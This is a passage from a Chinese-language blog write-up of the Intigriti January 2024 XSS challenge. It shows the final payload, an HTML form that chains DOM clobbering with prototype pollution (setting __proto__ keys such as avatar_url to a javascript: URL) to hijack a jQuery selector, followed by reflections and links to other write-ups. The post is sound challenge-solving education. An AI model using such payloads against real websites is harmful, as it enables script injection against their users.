+<h2><span id="還是得靠提示">還是得靠提示</span></h2><p>又過了一兩天，看到了作者在推特上的<a target="_blank" rel="noopener" href="https://twitter.com/kevin_mizu/status/1749740885657755842">提示</a>，直接明確指出關鍵就在於我之前因為太複雜所以略過的 addCombinator，從提示中可以看出，我確實只差最後一步了。</p>
+<p>因此又硬著頭皮花了半天左右，稍微 trace 了一下這部分的程式碼，最後才終於得到預期的答案。</p>
+<p>先附上最後的 payload：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>documentElement</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.owner.avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(document.domain)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.CLASS.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.TAG.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.dir<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentNode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.selector<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img.loading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其實最後一部分 addCombinator 那邊有點像是一半用猜的，一半是真的知道，大概就是某一個部分會用 <code>dir</code> 來找匹配的元素，設定成 parentNode 之後就會一直往上找，然後就會配對到整個 HTML 的元素，因此就會幫每一個 element 都加上 src，裡面當然也包含了 iframe。</p>
+<p>但每一個函式的細節我已經忘記了，因為真的有點複雜，如果有興趣知道的話，可以直接去看原作者的 writeup（底下會附上連結）。</p>
+<h2><span id="後記">後記</span></h2><p>我很喜歡這道題目那種循序漸進的感覺，從一開始找到非預期解以為很簡單，到後來找到第一個 cache 的地方以為解開了，卻回頭發現 axios 的 prototype pollution 沒辦法搭配使用，接著找到第二個 <code>compiled.seletor</code> 也以為結束了，才發現其實還沒。</p>
+<p>要一直再往下深追，追到 addCombinator，才能確定這一題是真的可以解開，能在一道題目裡面情緒起伏這麼多次，代表這個題目設計的很好。另一個我很喜歡的點是這是一道逼迫你 code review 的題目，沒看 code 的話是絕對解不開的。我很喜歡 code review，因此也很喜歡這個題目。</p>
+<p>很佩服作者能夠繼續往深處探索，找到這個非常有趣的答案，結合了 DOM clobbering 跟 prototype pollution，修改了 jQuery selector 的指向，出了一題這麼好玩的題目！</p>
+<p>再次推薦作者本人的 writeup，跟我經歷了差不多的過程：<a target="_blank" rel="noopener" href="https://mizu.re/post/intigriti-january-2024-xss-challenge">Intigriti January 2024 - XSS Challenge</a></p>
+<p>除此之外，@joaxcar 找到的另外一個非預期解也很有趣，有興趣的可以看看：<a target="_blank" rel="noopener" href="https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/">Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)</a></p>
+<p>若是對最一開始的題目有興趣，也可以參考這邊：<a target="_blank" rel="noopener" href="https://bugology.intigriti.io/intigriti-monthly-challenges/0124">https://bugology.intigriti.io/intigriti-monthly-challenges/0124</a></p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2024/02/12/dicectf-2024-writeup/">DiceCTF 2024 筆記</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">評論</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2024 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>繁體中文</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2024/02/17/en/intigriti-0124-writeup/" class="dropdown-item">
+                    English
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
